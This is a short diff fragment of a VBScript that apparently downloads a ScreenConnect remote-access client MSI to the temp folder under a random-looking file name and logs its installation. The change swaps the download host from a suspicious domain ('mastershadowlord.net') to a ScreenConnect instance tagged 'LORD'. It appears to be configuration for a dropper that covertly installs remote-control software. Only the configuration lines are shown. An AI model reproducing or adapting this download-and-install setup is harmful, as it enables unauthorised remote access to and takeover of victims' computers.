@@ -13,7 +13,7 @@ Set oWMI   = GetObject("winmgmts:\\.\root\cimv2")
 
 ' --- CONFIGURATION ---
 Dim sMsiUrl, sMsiPath, sTempDir, sLogFile, sBackupDir
-sMsiUrl    = "https://mastershadowlord.net/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+sMsiUrl    = "https://ackermantoyota.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=LORD&c=&c=&c=&c=&c=&c=&c="
 sTempDir   = oShell.ExpandEnvironmentStrings("%TEMP%")
 sMsiPath   = sTempDir & "\" & "56BSSW3K0000_10POJPQ9MT3B4_windows_x64.msi"
 sLogFile   = sTempDir & "\ScreenConnect_Install.log"
